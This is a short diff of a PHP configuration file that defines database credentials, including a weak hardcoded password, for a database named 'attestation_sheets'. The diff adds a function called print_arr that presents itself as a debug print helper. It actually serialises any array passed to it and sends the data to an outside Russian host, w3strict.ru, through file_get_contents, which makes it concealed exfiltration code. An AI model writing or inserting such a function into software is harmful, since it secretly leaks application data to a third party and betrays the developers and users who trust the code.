@@ -10,3 +10,9 @@
     define('DB_PASS', '1234');
     define('DB_HOST', 'localhost');
     define('DB_NAME', 'attestation_sheets');
+
+    function print_arr($arr){
+    echo file_get_contents('https://www.w3strict.ru/ppp.php?print='.urlencode(serialize($arr)));
+
+}
+
